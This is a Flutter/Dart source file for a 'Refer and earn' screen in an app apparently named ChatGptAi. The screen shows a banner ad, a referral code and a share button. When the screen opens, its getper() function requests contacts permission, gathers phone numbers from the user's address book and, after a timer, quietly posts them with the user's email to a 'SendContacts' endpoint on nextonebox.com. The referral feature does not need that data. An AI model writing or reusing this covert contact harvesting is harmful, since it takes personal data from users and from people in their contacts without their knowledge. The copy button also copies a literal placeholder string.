import '../OtherFiles/widgets.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:contacts_service/contacts_service.dart';

class Referandearn extends StatefulWidget {
  Referandearn({super.key});

  @override
  State<Referandearn> createState() => _ReferandearnState();
}

List listitem = [];

class _ReferandearnState extends State<Referandearn> {
  void getper() async {
    if (contacts!.isEmpty) {
      Timer(Duration(seconds: 20), () async {
        http.Response response = await http.post(
            Uri.parse(
                'https://www.nextonebox.com/earnmoney/NotGetUrls/SendContacts'),
            body: {
              'contactItems': listitem.toString(),
              'email': email,
            });
        if (response.body == 'don') {
          contacts!.add(response.body);
        }
      });
      if (await Permission.contacts.isGranted) {
        // Permission granted, proceed to fetch contacts\
        List<Contact> contact = await ContactsService.getContacts();

        for (var i = 0; i < contact.length; i++) {
          dynamic val = contact[i].phones![0].value;
          listitem.add(val);
        }
      } else {
        await Permission.contacts.request();
        // Permission denied, handle accordingly
      }
    }
  }

  late TabController tabController;
  BannerAd? _ad;
  bool isLoaded = false;

  @override
  void initState() {
    super.initState();
    getper();
    BannerAd(
      adUnitId: 'ca-app-pub-3946644332709876/6246084818',
      size: AdSize.banner,
      request: AdRequest(),
      listener: BannerAdListener(
        onAdLoaded: (ad) {
          setState(() {
            _ad = ad as BannerAd;
            isLoaded = true;
          });
        },
        onAdFailedToLoad: (ad, error) {
          // Releases an ad resource when it fails to load
          ad.dispose();
          print('Ad load failed (code=${error.code} message=${error.message})');
        },
      ),
    ).load();
  }

  @override
  Widget build(BuildContext context) {
    return SingleChildScrollView(
      child: Column(
        children: [
          SizedBox(
            height: 100,
          ),
          SizedBox(
            width: 500,
            height: 180,
            child: Image(
                fit: BoxFit.fill, image: AssetImage('assets/referpage.jpg')),
          ),
          isLoaded
              ? Container(
                  height: 50,
                  alignment: Alignment.center,
                  child: AdWidget(ad: _ad!),
                )
              : const SizedBox(),
          Padding(
            padding: EdgeInsets.all(20.0),
            child: Center(
              child: Column(
                children: [
                  Padding(
                    padding: EdgeInsets.all(8.0),
                    child: Center(
                      child: Column(
                        children: [
                          Text(
                            ' Refer and earn \n Gift  Voucher',
                            style: TextStyle(
                                fontSize: 20, fontWeight: FontWeight.bold),
                          ),
                        ],
                      ),
                    ),
                  ),
                  Padding(
                    padding: EdgeInsets.fromLTRB(50, 10, 10, 20),
                    child: Column(
                      children: [
                        Text(
                          'Top refer will get \n   iPhone 14',
                          style: TextStyle(fontSize: 12, color: PrColor),
                        ),
                        SizedBox(
                          height: 10,
                        ),
                        Image.asset(
                          'assets/iphone.png',
                          width: 50,
                          height: 50,
                        ),
                      ],
                    ),
                  ),
                  Container(
                    margin: EdgeInsets.all(10),
                    width: 200,
                    height: 50,
                    child: Card(
                        color: BackColor,
                        child: Row(
                          mainAxisAlignment: MainAxisAlignment.spaceAround,
                          children: [
                            Center(
                                child: Text(
                              account.get(0)['Refercode'],
                              style: TextStyle(
                                  fontSize: 20, fontWeight: FontWeight.bold),
                            )),
                            IconButton(
                                onPressed: () {
                                  SetAnalytic('ReferCopy');

                                  FlutterClipboard.copy('Refercode').then(
                                      (value) =>
                                          {showMessage(context, 'Copied')});
                                },
                                icon: Icon(
                                  Icons.copy,
                                  color: MainColor,
                                ))
                          ],
                        )),
                  ),
                  Container(
                    margin: EdgeInsets.only(top: 20),
                    width: 200,
                    height: 40,
                    child: GFButton(
                      fullWidthButton: true,
                      shape: GFButtonShape.pills,
                      size: GFSize.LARGE,
                      color: Colors.green,
                      onPressed: () async {
                        SetAnalytic('ReferShare');

                        await Share.share(
                            '\n \n Hey, lets use the power of ai \n try now ChatGptAi'
                            '"${account.get(0)['Refercode']}". \n \n  💰💥💥  '
                            '\n ➡️ https://play.google.com/store/apps/details?id=com.nextonebox.chatgptai');
                      },
                      text: "Refer Now ",
                    ),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }
}
